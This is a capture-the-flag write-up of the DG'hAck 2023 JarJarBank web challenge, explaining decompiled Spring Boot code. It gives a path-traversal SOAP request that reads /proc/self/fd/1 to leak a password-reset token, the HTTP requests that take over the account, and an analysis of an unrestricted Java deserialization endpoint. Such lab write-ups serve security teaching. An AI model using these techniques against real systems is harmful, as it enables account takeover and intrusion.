---
title: "DG'hAck 2023 - JarJarBank"
description: "TODO"
lead: "TODO"
date: 2023-01-01T00:00:00+00:00
lastmod: 2023-01-01T00:00:00+00:00
draft: true
images: []
menu:
  docs:
    parent: "writeup"
weight: 620
toc: true
---

## Challenge

Your mission, young padawan, is as follows: audit JarJarBank, identify the vulnerabilities that Count Dooku may have exploited so that JarJar can rectify them and restore order to the intergalactic bank!

- **Category**: Web - HARD
- **URL:** [http://jarjarbank.chall.malicecyber.com/](http://jarjarbank.chall.malicecyber.com/)
- **Attachment:** JarJarBank.zip

## Overview

### Project Structure

Within the ZIP archive, you'll find a `JAR` file that represents a Spring Boot application, along with a `docker-compose.yml` for self-hosting the challenge.c

```bash
$ 7z l JarJarBank.zip
[...]

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2023-10-19 21:29:32 .....          866          334  docker-compose.yml
2023-10-19 21:30:48 .....         1181          574  Dockerfile
2023-10-19 21:28:33 .....          301          205  main.sh
2023-10-19 21:28:06 D....            0            0  src
2023-10-18 22:03:51 .....     57975947     51993666  src/JarJarBank-1.0.jar
2023-10-19 21:33:30 .....          426          176  .env
------------------- ----- ------------ ------------  ------------------------
2023-10-19 21:33:30           57978721     51994955  5 files, 1 folders
```

You can use `jadx` for decompiling `JarJarBank-1.0.jar` to access the unobfuscated source code.

At the application's startup, three accounts are established: an **administrator**, a **support**, and a **customer**. The customer is identified by the email address `DGHACKCustomerUser@dghack.fr`. To obtain the first flag, your objective is to compromise this customer account and request the route `/api/v1/flag/getFirstFlag`.

```java
public class JarJarBank {
    @Autowired
    private Environment env;
    private static final Logger LOGGER = LoggerFactory.getLogger(JarJarBank.class);

    public static void main(String[] args) {
        SpringApplication.run(JarJarBank.class, args);
    }

    @Bean
    public CommandLineRunner commandLineRunner(AuthenticationService service) {
        return args -> {
            LOGGER.info("Creating JarJarBank users ...");
            RegisterRequest admin = RegisterRequest.builder().firstname("Admin").lastname("Admin").email(this.env.getProperty("ADMIN_EMAIL")).password(this.env.getProperty("ADMIN_PASSWORD")).role(UserRoles.ADMIN).build();
            service.register(admin);
            LOGGER.info(String.format("'%s' user created", admin.getEmail()));
            RegisterRequest support = RegisterRequest.builder().firstname("Support").lastname("User").email(this.env.getProperty("SUPPORT_EMAIL")).password(this.env.getProperty("SUPPORT_PASSWORD")).role(UserRoles.SUPPORT).build();
            service.register(support);
            LOGGER.info(String.format("'%s' user created", support.getEmail()));
            RegisterRequest customer = RegisterRequest.builder().firstname("Customer").lastname("User").email("DGHACKCustomerUser@dghack.fr").password(this.env.getProperty("CUSTOMER_PASSWORD")).role(UserRoles.CUSTOMER).build();
            service.register(customer);
            LOGGER.info(String.format("'%s' user created", customer));
        };
    }
}
```

### Authentication & Authorization

Authentication and authorization mechanisms are primarily defined within the `apiFilterChain` function. This function is responsible for implementing one or multiple rules for each route, ensuring the security and access control of the application.

```java
public class MultiHttpSecurityConfig {
    // ...
    @Bean
    public SecurityFilterChain apiFilterChain(HttpSecurity http, MvcRequestMatcher.Builder mvc) throws Exception {
        ((HttpSecurity) ((HttpSecurity) ((HttpSecurity) ((HttpSecurity) ((HttpSecurity) http
            // ...
            .requestMatchers(
                new AntPathRequestMatcher(ScriptUtils.DEFAULT_BLOCK_COMMENT_START_DELIMITER),
                new AntPathRequestMatcher("/resources/**"),
                // [...]
            ).permitAll()
            // ...
            .requestMatchers(AntPathRequestMatcher.antMatcher("/api/v1/management/**"))
            .hasAnyRole(UserRoles.ADMIN.name(), UserRoles.SUPPORT.name())
            .requestMatchers(AntPathRequestMatcher.antMatcher(HttpMethod.GET, "/api/v1/management/**"))
            .hasAnyAuthority(Permission.ADMIN_READ.name(), Permission.SUPPORT_READ.name())
            .requestMatchers(AntPathRequestMatcher.antMatcher(HttpMethod.POST, "/api/v1/management/**"))
            // ...
            .authenticationProvider(this.authenticationProvider)
            .addFilterBefore((Filter) maintenanceFilter(), UsernamePasswordAuthenticationFilter.class)
            .addFilterBefore((Filter) jwtAuthFilter(), UsernamePasswordAuthenticationFilter.class)
            .addFilterBefore((Filter) soapAuthenticationFilter(), UsernamePasswordAuthenticationFilter.class);
        return http.build();
    }
}
```

#### Authentication

**Filters:**

- **maintenanceFilter()**: Allow requests which starts with `/api/`, `/service/`, `/resources/` or `/maintenance`, otherwise redirect to `/maintenance`.
- **jwtAuthFilter()**: Authorization with `Bearer` token.
- **soapAuthenticationFilter()**: If requests starts with `/service/`, set role to `ROLE_SOAP` (`soap` user).

#### Authorization

**ALL**

- ScriptUtils.DEFAULT_BLOCK_COMMENT_START_DELIMITER
- /resources/**
- /api/v1/auth/**
- /api/v1/user/resetPassword
- /api/v1/user/savePassword

**SUPPORT** or **ADMIN**:

- POST, DELETE /api/v1/user/
- GET /api/v1/account/all
- GET /api/v1/account/getUserByAccountId
- POST, DELETE /api/v1/account/**
- /api/v1/management/**
- GET, POST, PUT. DELETE /api/v1/management/**

**ADMIN**:

- GET, POST, PUT, DELETE /api/v1/transaction/**

## Customer Account Takeover

> **TL;DR:** Account takeover through STDOUT log reading to reveal the reset password token of the customer account.

The `token` and `user` variables are logged when executing a `/resetPassword` request on an email address.

```java
@PostMapping({"/resetPassword"})
public ResponseEntity<?> resetPassword(HttpServletRequest request, @RequestParam("email") @Valid String userEmail) {
    User user = this.userService.findByEmail(userEmail);
    if (user == null) {
        // [...]
    } else {
        String token = randomToken(32);
        this.userService.createPasswordResetTokenForUser(user, token);
        LOGGER.info(String.format("Reset password token '%s' created for user '%s'", token, user));
        return new ResponseEntity<>(new MessageResponse(this.messages.getMessage("message.resetPasswordEmail", null, request.getLocale())), HttpStatus.CREATED);
    }
}
```

This Spring Boot application expose a SOAP service at `/service`.

> SOAP is a messaging protocol. Messages (requests and responses) are XML documents over HTTP. The XML contract is defined by the WSDL (Web Services Description Language). It provides a set of rules to define the messages, bindings, operations, and location of the service. Source [Creating a SOAP Web Service with Spring](https://www.baeldung.com/spring-boot-soap-web-service).

The function `defaultWsdl11Definition` will expose a WSDL definition for your SOAP web service. The WSDL defines the structure of the SOAP messages that your service expects and the operations it supports. The WSDL definition is available at [https://jarjarbank.chall.malicecyber.com/service/defaultWsdl11Definition.wsdl](https://jarjarbank.chall.malicecyber.com/service/defaultWsdl11Definition.wsdl).

```java
@EnableWs
@Configuration
/* loaded from: JarJarBank-1.0.jar:BOOT-INF/classes/com/dghack/jarjarbank/config/WebServiceConfig.class */
public class WebServiceConfig extends WsConfigurerAdapter {
    @Bean
    public ServletRegistrationBean<MessageDispatcherServlet> messageDispatcherServlet(ApplicationContext applicationContext) {
        MessageDispatcherServlet servlet = new MessageDispatcherServlet();
        servlet.setApplicationContext(applicationContext);
        servlet.setTransformWsdlLocations(true);
        return new ServletRegistrationBean<>(servlet, "/service/*");
    }

    @Bean
    public DefaultWsdl11Definition defaultWsdl11Definition(XsdSchema transactionSchema) {
        DefaultWsdl11Definition wsdl11Definition = new DefaultWsdl11Definition();
        wsdl11Definition.setPortTypeName("transactionServicePort");
        wsdl11Definition.setLocationUri("/service");
        wsdl11Definition.setTargetNamespace("http://www.jarjarbank.dghack.fr/xml/");
        wsdl11Definition.setSchema(transactionSchema);
        return wsdl11Definition;
    }

    @Bean
    public XsdSchema transactionSchema() {
        return new SimpleXsdSchema(new ClassPathResource("xsd/transaction.xsd"));
    }
}
```

The SOAP service provides a single request (`transactionRequest`) and response (`TransactionResponse`) pair, which enables the user to read a file. You can utilize the `defaultWsdl11Definition` to construct the XML request body required to carry out this action.

```java
@Endpoint
/* loaded from: JarJarBank-1.0.jar:BOOT-INF/classes/com/dghack/jarjarbank/controller/v1/webservices/soap/ManagementEndpoint.class */
public class ManagementEndpoint {
    private static final String NAMESPACE_URI = "http://www.jarjarbank.dghack.fr/xml/";
    final ArrayList<String> listAllowedExtensions = new ArrayList<>(Arrays.asList(XMLDeclaration.DEFAULT_KEYWORD, "json", "pdf", "docx", "doc"));
    @Value("${application.transactionFolder}")
    private String transactionFolder;

    @PayloadRoot(namespace = NAMESPACE_URI, localPart = "transactionRequest")
    @ResponsePayload
    public TransactionResponse getTransactionFile(@RequestPayload TransactionRequest request) {
        FileManager fileManager = new FileManager(this.transactionFolder + request.getTransactionFile(), this.listAllowedExtensions);
        String transactionContent = fileManager.readFileContent();
        TransactionResponse response = new TransactionResponse();
        response.setTransactionData(transactionContent);
        return response;
    }
}
```

The file path must match the following regex: 

```java
ArrayList<String> listAllowedExtensions = new ArrayList<>(
    Arrays.asList(XMLDeclaration.DEFAULT_KEYWORD, "json", "pdf", "docx", "doc"));

private boolean validateFileExtension(String fileName) {
    String regexFileCheck = "(^.*\\d+$|^.*\\d+\\.(" + String.join("|", this.listAllowedExtensions) + ")$)";
    Pattern fileExtnPtrn = Pattern.compile(regexFileCheck);
    Matcher m = fileExtnPtrn.matcher(fileName);
    return m.matches();
}
```

So, we have the ability to read any files that either end with one or more digits or end with digits followed by a specific extension (`json|pdf|docx|doc`). For instance, you can read `/proc/self/fd/1` because it ends with a single digit. 

```
(^.*d+$|^.*d+\.(json|pdf|docx|doc))

^.*d+$
or
^.*d+\.(json|pdf|docx|doc)
```

**Workflow:**

1. *Response hanging* - Read current process STDOUT (`/proc/self/fd/1`) to obtain logs output
2. Trigger a reset password on the customer account, the `token` will be logged on STDOUT
3. *Response release* - Obtain the reset password token on the response body

Request to `POST /service/`:

```
POST /service/ HTTP/1.1
Host: jarjarbank.chall.malicecyber.com
[...]
Content-type: text/xml
Content-Length: 304

<SOAP-ENV:Envelope
    xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
    <SOAP-ENV:Header/>
    <SOAP-ENV:Body>
        <ns3:transactionRequest
            xmlns:ns3="http://www.jarjarbank.dghack.fr/xml/">
            <transactionFile>../../proc/self/fd/1</transactionFile>
        </ns3:transactionRequest>
    </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

Trigger a reset password:

```
POST /api/v1/user/resetPassword HTTP/1.1
Host: jarjarbank.chall.malicecyber.com
[...]

email=DGHACKCustomerUser@dghack.fr
```

Response from `POST /services/`:

```xml
<SOAP-ENV:Envelope
    xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
    <SOAP-ENV:Header/>
    <SOAP-ENV:Body>
        <ns3:transactionResponse xmlns:ns3="http://www.jarjarbank.dghack.fr/xml/">
            <transactionData>
            2023-12-04T08:13:43.363Z  INFO 1 --- [nio-8080-exec-7] c.d.j.c.v1.api.UserRestController        :
            Reset password token '04CgzNqCoaAufWSxUQQnayPJVV4CuTeN' created for user
                'User {id=3, email='DGHACKCustomerUser@dghack.fr', firstName='Customer', lastName='User', mobileNumber='null', roles=CUSTOMER}'
            </transactionData>
        </ns3:transactionResponse>
    </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

Reset the password of the customer account using the token: 

```
POST /api/v1/user/savePassword HTTP/1.1
Host: jarjarbank.chall.malicecyber.com
Content-Type: application/json
[...]

{"token":"04CgzNqCoaAufWSxUQQnayPJVV4CuTeN","newPassword":"xyz"}
```

Log into the custom account and get the first flag:

```
GET /api/v1/flag/getFirstFlag HTTP/1.1
Host: jarjarbank.chall.malicecyber.com
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJE...
[...]
```

> `Congratz ! Here is your first flag: DGHACK{F1l3_r34d_l0gs_t0_4cc0unt_t4k30v3r}. Keep digging and you'll find another flag :)`

## RCE using deserialization

> **TL;DR** Exploit a Java unprotected deserialization vulnerability to obtain Remote Code Execution.

Later on, we will discover that the route `/api/v1/transaction/import?transaction=<INPUT>` involves deserialization of the `SignedObject` using the input provided.

```java
@RequestMapping({"api/v1/transaction"})
@RestController
public class TransactionRestController {
    // ...
    @RequestMapping({"/import"})
    public ResponseEntity<?> importTransaction(HttpServletRequest request) {
        ResponseEntity<?> response;
        String transactionData;
        try {
            LOGGER.info(String.format("New transaction import from ip: '%s'", request.getRemoteAddr()));
            transactionData = request.getParameter("transaction");
        } catch (Throwable th) {
            // ...
        }
        Transaction transactionToImport = (Transaction) TransactionAPI.getTransaction(transactionData);
        response = ResponseEntity.ok(transactionToImport);
        return response;
    }
}
```

In the **Authorization** section, it is evident that the route `GET, POST, PUT, DELETE /api/v1/transaction/**` is limited to administrators only. However, it's worth noting that not all HTTP request methods are explicitly restricted (i.e., `HEAD` and `OPTIONS` are not blacklisted), and the `/import` route uses `@RequestMapping` instead of `@PostMapping`, making all HTTP verbs accessible.

Now, let's shift our attention to the GET parameter `transaction`, which expects two components: a `version` and a base64-encoded `data` (due to encryption). The `version` should be one of the following:
- `$1$` (XMLDeclaration.DEFAULT_VERSION) - Utilizes the DESTransactionEncryptor
- `$2$` (2.0) - Utilizes the AESTransactionEncryptor
- `$LEGACY$` (LEGACY) - Utilizes the RC4TransactionEncryptor

```java
public class TransactionAPI {
    private static final Logger LOGGER = LoggerFactory.getLogger(TransactionAPI.class);

    public static Object getTransaction(String paramString) throws Exception {
        String version = getVersion(paramString);
        String data = getData(paramString);
        return TransactionImporter.importTransaction(data, getTransactionConfig(version));
    }

    private static String getData(String data) {
        Pattern pattern = Pattern.compile("\\$(?:\\d|LEGACY)\\$((?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+]{4})$)");
        Matcher matcher = pattern.matcher(data);
        if (!matcher.find()) {
            LOGGER.error("Unable to retrieve data from transaction file");
            throw new IllegalStateException("Wrong transaction data format.");
        }
        return matcher.group(1);
    }

    private static String getVersion(String paramString) {
        String version;
        if (paramString.startsWith("$1$")) {
            version = XMLDeclaration.DEFAULT_VERSION;
        } else if (paramString.startsWith("$2$")) {
            version = "2.0";
        } else if (paramString.startsWith("$LEGACY$")) {
            version = "LEGACY";
        } else {
            throw new IllegalStateException("Unrecognized version");
        }
        return version;
    }

    private static CryptoConfigurator getTransactionConfig(String version) throws Exception {
        CryptoConfigurator cryptoConfig = new CryptoConfigurator();
        InputStream inputStream = Thread.currentThread().getContextClassLoader().getResourceAsStream("transaction-keystore.jks");
        if (inputStream == null) {
            throw new Exception("Couldn't load keystore!");
        }
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        IOUtils.copy(inputStream, byteArrayOutputStream);
        cryptoConfig.setKeyStore(byteArrayOutputStream.toByteArray());
        cryptoConfig.setVerifyingAlias("TransactionV" + version);
        cryptoConfig.setSecretKey("DGH@CK2023!".toCharArray());
        cryptoConfig.setVersion(version);
        cryptoConfig.setKeyStoreType(SSL.DEFAULT_KEYSTORE_TYPE);
        IOUtils.closeQuietly(inputStream);
        return cryptoConfig;
    }
}
```


```java
public class TransactionImporter {
    public static Object importTransaction(String transactionData, CryptoConfigurator cryptoConfig) throws Exception {
        TransactionEncryptorHelper transactionEncryptor = new TransactionEncryptorHelper();
        transactionEncryptor.initialize(cryptoConfig.getVersion());
        byte[] decoded_byteArray = Base64.getDecoder().decode(transactionData.getBytes(StandardCharsets.UTF_8));
        return transactionEncryptor.verify(transactionEncryptor.decrypt(decoded_byteArray), cryptoConfig);
    }
}

public class TransactionEncryptorHelper {
    private boolean context;
    private TransactionEncryptor transactionEncryptor;
    private static final Logger LOGGER = LoggerFactory.getLogger(TransactionEncryptorHelper.class);

    public void initialize(String version) throws Exception {
        LOGGER.info(String.format("Initialization of TransactionEncryptor for version '%s'", version));
        if (version.equals(XMLDeclaration.DEFAULT_VERSION)) {
            this.transactionEncryptor = new DESTransactionEncryptor();
        } else if (version.equals("2.0")) {
            this.transactionEncryptor = new AESTransactionEncryptor();
        } else {
            this.transactionEncryptor = new RC4TransactionEncryptor();
        }
        this.context = true;
    }

    public byte[] decrypt(byte[] data) throws Exception {
        if (!this.context) {
            throw new IllegalStateException("Transaction Encryptor has not been initialized");
        }
        return this.transactionEncryptor.decrypt(data);
    }

    public Object verify(byte[] data, CryptoConfigurator cryptoConfig) throws Exception {
        LOGGER.info("Verifying transaction signature");
        PublicKey pubKey = Utils.getPublicKey(cryptoConfig);
        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(data));
        SignedObject signedTransaction = (SignedObject) in.readObject();
        Signature signature = Signature.getInstance(this.transactionEncryptor.getAlgorithm());
        if (!signedTransaction.verify(pubKey, signature)) {
            LOGGER.error("Unable to verify the signature of the transaction file to be imported");
            throw new IOException("Unable to verify signature");
        }
        return signedTransaction.getObject();
    }
}
```

